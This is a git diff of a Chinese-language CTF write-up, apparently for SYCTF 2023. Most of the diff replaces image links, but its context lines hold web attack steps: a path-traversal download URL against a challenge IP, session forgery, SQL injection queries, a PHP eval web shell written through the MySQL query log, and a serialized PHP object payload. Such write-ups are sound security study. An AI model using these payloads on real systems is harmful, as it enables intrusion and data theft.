@@ -129,11 +129,13 @@ print("Flag:", flag)
 选择难度120，随便一个9x9答案，getshell读取flag
 
 ### 烦人的压缩包
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686369320150-37c2ab68-0900-4e9f-a846-73bce5cb00a1.png#averageHue=%23e8d39c&clientId=u1d842e86-99e1-4&from=paste&height=405&id=u5e06e5da&originHeight=405&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53366&status=done&style=none&taskId=u28d66242-1653-4732-b9d9-5b1235c5cc3&title=&width=798)
+![image-20230805100349396](C:\Users\cc\AppData\Roaming\Typora\typora-user-images\image-20230805100349396.png)
 foremost love.jpg得到一个压缩包，crc校验错误
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686370166843-ce2907f6-4afe-491f-b1d8-619bd0f65183.png#averageHue=%233c3830&clientId=u1d842e86-99e1-4&from=paste&height=150&id=u23939336&originHeight=150&originWidth=586&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30843&status=done&style=none&taskId=ue952ecc9-ad9e-4ee5-8abd-3f0fa70e21f&title=&width=586)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686370154469-2bb8f7f1-ace4-4e26-a630-ea0262491511.png#averageHue=%23a4beb4&clientId=u1d842e86-99e1-4&from=paste&height=154&id=u57f99a46&originHeight=154&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22362&status=done&style=none&taskId=u8777f6d1-34f4-4c0f-ba79-a271ea8673a&title=&width=616)
+![image-20230805100532370](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051005437.png)
+
+![](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051004932.png)
 Ook! 解码
+
 ### sudoku**_speedrun**
 ```php
 #全局变量记录空位置（使用回溯法）
@@ -287,36 +289,42 @@ if __name__ == "__main__":
 [https://www.o2takuxx.com/index.php/2023/06/11/syctf-2023-carelesspy/](https://www.o2takuxx.com/index.php/2023/06/11/syctf-2023-carelesspy/)
 /eval、/login、/download三个路由
 /eval
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677180-a924835c-5f98-41e6-93fa-f4a4b3534c8f.png#averageHue=%23e5e5e4&clientId=u837ff099-412b-4&from=paste&id=u7a3038ef&originHeight=399&originWidth=1276&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0e731d43-a223-479f-a86d-88d58ed61a6&title=)
+![](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051007281.png)
 猜猜是咋写的？
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677293-e146cc08-48be-4faf-a268-a0d9d419c4e7.png#averageHue=%23eaeaea&clientId=u837ff099-412b-4&from=paste&id=u7c7d5c3b&originHeight=714&originWidth=1920&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ub0357994-4e10-4533-bf20-a39661bf6f0&title=)
+![](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051007095.png)
 /login
 登录页面，弱密码登录不了
 /download
 可利用目录穿越下载文件，通过eval路由发现/app/__pycache__/part.cpython-311.pyc
 任意文件读取：
+
 ```php
 http://47.108.165.60:42577/download?file=.%2F..%2F..%2F..%2F..%2Fapp%2F__pycache__%2Fpart.cpython-311.pyc
 ```
 pyc反编译：[https://tool.lu/pyc/](https://tool.lu/pyc/)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677050-fc2708e5-fc8f-486e-b618-e87c96dce76e.png#averageHue=%23faf9f9&clientId=u837ff099-412b-4&from=paste&id=u5dad7bb8&originHeight=402&originWidth=948&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf92c1efb-b061-46a9-a4cf-901ab021a6f&title=)
+![image-20230805100920845](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051009938.png)
 伪造session
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677078-6484ef50-7b9d-4027-bbfe-9f86a3311264.png#averageHue=%23262a35&clientId=u837ff099-412b-4&from=paste&id=u5310ebc7&originHeight=264&originWidth=946&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=udb255c51-d2aa-4d10-8a6b-ca24854c8e0&title=)
+![image-20230805100952154](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051009282.png)
 /login
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677099-ea493994-56c3-459d-b211-1b8ef6960460.png#averageHue=%232f2f2f&clientId=u837ff099-412b-4&from=paste&id=u52e6f19e&originHeight=356&originWidth=1332&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u35ffe069-9cbb-43f0-8e2c-ab53b6be9c8&title=)
+![](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051010432.png)
 /th1s_1s_The_L4st_one
 应该是XXE
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677722-6f16fa8d-21f8-4a16-89eb-ea6bd96be6b0.png#averageHue=%23f4f4f4&clientId=u837ff099-412b-4&from=paste&id=u03cff6dd&originHeight=232&originWidth=1037&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u04c3d2a5-e223-484f-9e7d-37d3f244071&title=)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677662-1e6dee75-cce4-4b39-8760-c8c2ab35a8db.png#averageHue=%232e2e2e&clientId=u837ff099-412b-4&from=paste&id=u928e2737&originHeight=587&originWidth=1285&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u84ef4f80-1efb-49d8-aaa7-34f03f09178&title=)
+![image-20230805101326194](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051013272.png)
+
+![image-20230805102245828](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051022096.png)
+
 ### Confronting robot
 myname存在sql注入点
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686371387984-429d44b6-a579-4206-907b-de246fcb8782.png#averageHue=%231b1b1b&clientId=u1d842e86-99e1-4&from=paste&height=208&id=u141d77b6&originHeight=208&originWidth=468&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24829&status=done&style=none&taskId=u519f6bb1-269e-4219-a924-fb6d441626e&title=&width=468)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689314897432-050eee59-2461-4fef-ad63-26ec5c32c886.png#averageHue=%23242731&clientId=u6b8027cc-70f2-4&from=paste&id=u7cb65f4a&originHeight=768&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8e12babe-e801-4b7e-a2fc-0ecfbfb20aa&title=)
+
+![image-20230805102318120](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051023276.png)
+
+![image-20230805102327839](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051023216.png)
 得到路由/sEcR@t_n@Bodyknow.php，可直接执行sql
+
 ```
 select group_concat(table_name) from information_schema.tables where table_schema = database()
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388074219-2b8d725f-dee4-4f60-ad39-17ee2a3c1e6d.png#averageHue=%2398986c&clientId=u837ff099-412b-4&from=paste&height=399&id=u30c4a4e7&originHeight=399&originWidth=1276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=804327&status=done&style=none&taskId=u8378373f-dbaa-4400-8b0a-c93444c51e0&title=&width=1276)
+![image-20230805102346519](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051023228.png)
 #### 思路1 日志写马
 开启全局的通用查询日志之后直接日志写马导致WEBSHELL
 ```
@@ -330,9 +338,10 @@ select "<?php eval($_POST['pass']);?>";
 ```
 蚁剑连接game.php得到flag
 #### 思路2 主从复制
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689319393860-977c171d-338a-46b4-95dc-8c3d240d860d.png#averageHue=%23a9a770&clientId=u6b8027cc-70f2-4&from=paste&height=830&id=u7af36d74&originHeight=830&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=485570&status=done&style=none&taskId=ud300b63f-d7b8-412c-aeff-abf0a63f4ef&title=&width=534)
+![image-20230805102358956](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051023406.png)
 无法直接insert数据，采取主从复制的方法
 查看数据库版本：
+
 ```
 select version();
 ```
@@ -416,10 +425,11 @@ $a = new SplStack();
 $a -> push($evilClass);
 echo serialize($a);
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689323281536-fcc032bf-62c2-4da4-b1b1-ea063265a089.png#averageHue=%23f9f8f7&clientId=u6b8027cc-70f2-4&from=paste&height=789&id=u33df7da0&originHeight=789&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113404&status=done&style=none&taskId=u8dae5214-478f-4b21-af4c-3773965b1ae&title=&width=1362)
+![image-20230805102419604](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051024142.png)
 （这里不知道为什么，参数是在倒数第二个数据那；next(getallheaders())应该是第二个？
+
 ### tasks
 界面发现项目地址，代码审计，发现sqlite注入点
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689324232480-2a33f28f-7d77-46fa-b393-704361b7997c.png#averageHue=%230f141b&clientId=uc33bb396-ec86-4&from=paste&height=768&id=u25de6118&originHeight=768&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48558&status=done&style=none&taskId=u132e9908-8a9e-45ba-9095-b84877fe59b&title=&width=930)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689324304381-87952ea5-c75a-4281-96f5-887aeebcc81a.png#averageHue=%238fc09e&clientId=uc33bb396-ec86-4&from=paste&height=610&id=uf77e6ae3&originHeight=610&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151722&status=done&style=none&taskId=u03b64d50-4c71-470a-973d-b9e26f49c3f&title=&width=952)
+![image-20230805102437419](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051024991.png)
+![image-20230805102452861](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051024627.png)
 
